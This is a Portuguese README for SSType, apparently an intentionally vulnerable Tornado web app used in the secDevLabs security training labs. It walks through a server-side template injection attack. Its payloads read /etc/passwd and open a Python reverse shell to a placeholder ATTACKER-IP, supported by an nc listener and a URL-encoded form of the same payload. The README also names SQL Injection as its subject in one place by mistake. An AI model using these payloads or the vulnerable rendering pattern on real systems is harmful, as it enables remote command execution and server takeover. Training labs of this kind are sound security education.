# SSType

<p align="center"><img  src="src/images/ssti-logo.png"/></br>
    <a href="README.md"><img height="24" title="Access content in English" src="https://img.shields.io/badge/Access%20content%20in-English-blue"/></a></p>

SSType é um aplicativo web Python simples que contém um exemplo de uma vulnerabilidade de injeção de modelo do lado do servidor no Tornado. Neste exemplo, uma subcategoria específica de Injeção será exemplificada: Server Side Injection ou SSTI.

## Index

- [SSType](#sstype)
  - [Index](#index)
  - [O que é injeção?](#o-que-é-injeção)
  - [Como inicializar o aplicativo?](#como-inicializar-o-aplicativo)
  - [Conheça o app 💉](#conheça-o-app-)
  - [Narrativa de ataque](#narrativa-de-ataque)
    - [👀](#)
      - [Lack of input validation allows injection of OS commands](#lack-of-input-validation-allows-injection-of-os-commands)
    - [🔥](#-1)
  - [Proteger este aplicativo](#proteger-este-aplicativo)
  - [PR Soluções](#pr-soluções)
  - [Contribuição](#contribuição)

## O que é injeção?

Falhas de injeção, como injeção de SQL, NoSQL, SO e LDAP, ocorrem quando dados não confiáveis ​​são enviados a um interpretador como parte de um comando ou consulta. Os dados hostis do invasor podem induzir o intérprete a executar comandos não intencionais ou acessar dados sem a devida autorização.

O principal objetivo deste projeto é discutir como as vulnerabilidades de **SQL Injection** podem ser exploradas e incentivar os desenvolvedores a enviar solicitações de pull do **secDevLabs** sobre como mitigar essas falhas.

## Como inicializar o aplicativo?

Para iniciar este **aplicativo inseguro** intencionalmente, você precisará do [Docker][Docker Install] e do [Docker Compose][Docker Compose Install]. Depois de clonar o repositório [secDevLabs](https://github.com/globocom/secDevLabs), no seu computador, você deve digitar os seguintes comandos para iniciar o aplicativo:

```sh
cd secDevLabs/owasp-top10-2021-apps/a3/sstype
```

```sh
make install
```

Depois é só visitar [localhost:10001][app], conforme exemplificado abaixo:

<p align="center"><img  src="images/SSType.jpg"/></p>

## Conheça o app 💉

Para entender corretamente como este aplicativo funciona, você pode fazer uma pesquisa usando `name` como uma string de consulta usando um [browser](http://localhost:10001/?name=Vitor) ou usando `curl` em um terminal: 

```sh
curl http://localhost:10001/?name=Vitor
```

<p align="center"><img  src="images/attack0.png"/></p>

## Narrativa de ataque

Agora que você conhece o propósito deste aplicativo, o que pode dar errado? A seção a seguir descreve como um invasor pode identificar e, eventualmente, encontrar informações confidenciais sobre o aplicativo ou seus usuários. Recomendamos que você siga estas etapas e tente reproduzi-las por conta própria para entender melhor o ataque! 😜

### 👀

#### Lack of input validation allows injection of OS commands

Após revisar o código da aplicação, foi possível verificar que a entrada do usuário (variável `name` querystring) não está sendo tratada corretamente antes de ser renderizada no template, conforme mostrado nos trechos de código a seguir: 

```python
def get(self):
    name = self.get_argument('name', '')
    template_data = tmpl.replace("NAMEHERE",name)
    t = tornado.template.Template(template_data)
    self.write(t.generate(name=name))
```

```html
<h3>Hello: NAMEHERE</h3>
<h2>Try with /?name=YourName</h2>
```

Para confirmar que o campo de entrada é vulnerável, a seguinte carga útil pode ser usada para testar se o resultado de `4*4` pode ser renderizado na página:
```
http://localhost:10001/?name={{4*4}}
```

Quando esta requisição chegar à aplicação, `NAMEHERE` será substituído no HTML e executará a matemática, retornando `16`:

```html
<h3>Hello: {{4*4}}</h3>
<h2>Try with /?name=YourName</h2>
```

<p align="center"><img  src="images/attack1.png"/></p>

### 🔥

Um invasor pode agora criar qualquer comando malicioso que, em teoria, será executado. O primeiro passo que podemos fazer é tentar ler o conteúdo do arquivo `/etc/passwd`. Para fazer isso, usaremos o seguinte comando Python como a string de consulta `name`:

```python
{%import os%}{{os.popen('cat /etc/passwd').read()}}
```

<p align="center"><img  src="images/attack2.png"/></p>

Excelente! Agora que podemos executar comandos no servidor que hospeda o aplicativo, um script Python malicioso para nos fornecer um shell de alguma forma no servidor da vítima pode ser criado. Vamos dar uma olhada no seguinte exemplo:

```python
import socket,subprocess,os

# creates a socket to estabilish the connection between the victim and the attacker
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER-IP","ATTACKER-PORT"))

# configures STDIN, STDOUT and STDERR to be used in the shell
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

# spawns an interactive sh shell
p=subprocess.call(["/bin/bash","-i"]);
```

Para receber um shell reverso, primeiro precisamos usar `nc` em nosso terminal para ouvir todas as conexões que chegam ao nosso `ATTACKER-IP` e `ATTACKER-PORT` e depois executar este script Python no servidor vítima:

```sh
nc -nlv ATTACKER-PORT
```

Mas como podemos usar esse payload dentro do parâmetro `name`? Para fazer isso, podemos compactá-lo usando múltiplos `;` para separar cada instrução, resultando na seguinte carga útil:

```
Don't forget to replace `ATTACKER-IP` and `ATTACKER-PORT` below!
```

```python
{%import os%}{{os.popen("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER-IP\",ATTACKER-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'").read()}}
```

No entanto, como pode haver alguns caracteres especiais nessa string, precisamos escapar deles antes de injetá-los no aplicativo vulnerável (este [codificador de URL online](https://www.urlencoder.org/) pode ajudar) e esperamos como o Shell:

```python
%7B%25import%20os%25%7D%7B%7Bos.popen%28%22python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ATTACKER-IP%5C%22%2CATTACKER-PORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22%2Fbin%2Fbash%5C%22%2C%5C%22-i%5C%22%5D%29%3B%27%22%29.read%28%29%7D%7D
```

<p align="center"><img  src="images/attack3.png"/></p>

## Proteger este aplicativo

Como você arrumaria essa vulnerabilidade? Após a modificação do código, um invasor não poderá executar comandos no servidor.

## PR Soluções

[Alerta de spoiler 🚨 ] Para entender como essa vulnerabilidade pode ser resolvida, confira [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Aclosed+is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3ASSType)!

## Contribuição

Nós encorajamos você a contribuir com o SecDevLabs! Por favor, confira a seção [Contribuição no SecDevLabs](../../../docs/CONTRIBUTING.md) de como fazer a sua contribuição!🎉 🎉

[docker install]: https://docs.docker.com/install/
[docker compose install]: https://docs.docker.com/compose/install/
[app]: http://localhost:10001
[secdevlabs]: https://github.com/globocom/secDevLabs
